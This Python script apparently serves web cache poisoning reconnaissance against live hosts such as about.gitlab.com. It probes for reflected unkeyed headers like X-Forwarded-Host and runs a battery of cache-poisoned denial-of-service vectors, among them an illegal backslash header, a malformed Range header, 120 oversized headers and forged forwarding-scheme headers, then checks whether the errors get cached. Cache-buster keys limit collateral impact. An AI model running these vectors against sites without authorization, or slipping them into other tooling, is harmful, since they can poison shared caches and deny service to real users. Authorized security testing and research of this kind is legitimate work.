#!/usr/bin/env python3
"""
Phase B - active cache-key probing + gadget battery (SAFE / cachebusted).
Every request carries a unique ?dontpoisoneveryone= key so only our own
cache entry is ever touched. For CPDoS we send poison+verify on the SAME
cachebusted key and check if the error persists (CF-Cache-Status: HIT) -
proving the class without affecting any real path.
"""
import json, sys, uuid, argparse, time
import urllib3, requests
urllib3.disable_warnings()

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/140.0.0.0 Safari/537.36"
CANARY = "wcxcanary" + uuid.uuid4().hex[:6]

def cc(h): return {k.lower(): v for k, v in h.items()}
def hit(h): return "hit" in cc(h).get("cf-cache-status","").lower() or "hit" in cc(h).get("x-cache","").lower()

def get(url, headers=None, method="GET", data=None, redir=False, timeout=8):
    return requests.request(method, url, headers={"User-Agent": UA, **(headers or {})},
                            data=data, timeout=timeout, verify=False, allow_redirects=redir)

def probe_host(base):
    """base like https://about.gitlab.com"""
    findings = []
    def key(tag): return f"{base}/?dontpoisoneveryone={tag}-{uuid.uuid4().hex[:6]}"

    # --- fast liveness gate: 1 request, 6s; skip dead hosts ---
    try:
        alive = get(base + "/?dontpoisoneveryone=alive" + uuid.uuid4().hex[:6], timeout=6)
    except Exception as e:
        return [("DEAD", {"err": str(e)[:60]})]

    # --- 1. Query-string keyed? (does CF include query in key here) ---
    try:
        k = key("q")
        r1 = get(k); r2 = get(k)
        findings.append(("query_keyed_check", {"cf1": cc(r1.headers).get("cf-cache-status"),
                         "cf2": cc(r2.headers).get("cf-cache-status"), "hit2": hit(r2.headers)}))
    except Exception as e: findings.append(("query_keyed_check", {"err": str(e)[:80]}))

    # --- 2. Unkeyed header reflection (X-Forwarded-Host etc.) ---
    for hdr in ["X-Forwarded-Host", "X-Host", "X-Forwarded-Server"]:
        try:
            r = get(key("xfh"), headers={hdr: CANARY + ".example.com"})
            reflected = CANARY in r.text
            if reflected:
                findings.append(("HEADER_REFLECTED", {"header": hdr, "canary": CANARY}))
        except Exception: pass

    # --- 3. CPDoS battery: does a malformed input yield a CACHED error? ---
    cpdos_vectors = {
        "hmc_backslash_header": ({"\\": "x"}, "GET", None),        # illegal header name
        "bad_range": ({"Range": "bytes=cow"}, "GET", None),
        "bad_content_type": ({"Content-Type": "wcx-invalid"}, "GET", None),
        "bad_transfer_encoding": ({"Transfer-Encoding": "wcx-invalid"}, "GET", None),
        "scheme_contradiction": ({"X-Forwarded-SSL": "off"}, "GET", None),
        "oversize_header": ({f"X-Big-{i}": "A"*80 for i in range(120)}, "GET", None),
        "scanner_ua": ({"User-Agent": "Fuzz Faster U Fool"}, "GET", None),
        "xfs_redirect_loop": ({"X-Forwarded-Scheme": "http"}, "GET", None),
        "xfproto_http": ({"X-Forwarded-Proto": "http"}, "GET", None),
    }
    for name, (hdrs, method, data) in cpdos_vectors.items():
        try:
            k = key(name)
            rp = get(k, headers=hdrs, method=method, data=data, redir=False)
            time.sleep(0.5)
            rv = get(k, redir=False)  # clean verify on same key
            base_r = get(key("baseline"), redir=False)
            error_triggered = rp.status_code >= 400 or (300 <= rp.status_code < 400)
            differs = rp.status_code != base_r.status_code
            cached = hit(rv.headers)
            verify_bad = rv.status_code == rp.status_code and rv.status_code != base_r.status_code
            if (error_triggered and differs) or verify_bad:
                findings.append(("CPDOS_CANDIDATE", {
                    "vector": name, "poison_status": rp.status_code,
                    "baseline_status": base_r.status_code, "verify_status": rv.status_code,
                    "verify_cf": cc(rv.headers).get("cf-cache-status"),
                    "verify_cached_error": verify_bad and cached,
                    "location": cc(rp.headers).get("location")}))
        except Exception as e:
            findings.append(("CPDOS_ERR", {"vector": name, "err": str(e)[:60]}))

    # --- 4. Normalization discrepancy quick check (backslash / //) ---
    for path in ["//?dp=" + uuid.uuid4().hex[:6], "/%5c?dp=" + uuid.uuid4().hex[:6]]:
        try:
            r = get(base + path, redir=False)
            findings.append(("normalization", {"path": path.split('?')[0],
                             "status": r.status_code, "cf": cc(r.headers).get("cf-cache-status")}))
        except Exception: pass

    return findings

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--hosts", nargs="+", required=True)
    ap.add_argument("--outfile", required=True)
    args = ap.parse_args()
    out = {}
    jsonl = args.outfile.replace(".json", ".jsonl")
    jf = open(jsonl, "a", buffering=1)  # line-buffered, crash-safe
    for h in args.hosts:
        base = h if h.startswith("http") else "https://" + h
        f = probe_host(base)
        out[base] = f
        jf.write(json.dumps({base: f}) + "\n"); jf.flush()
        real = [x for x in f if x[0] in ("HEADER_REFLECTED",) or (x[0] == "CPDOS_CANDIDATE" and x[1].get("verify_cached_error"))]
        tag = "!!!REAL" if real else "   ok"
        print(f"{tag} {base}  {real if real else ''}", flush=True)
    json.dump(out, open(args.outfile, "w"), indent=2)
    print(f"\nsaved -> {args.outfile} (+ {jsonl})", flush=True)

if __name__ == "__main__":
    main()
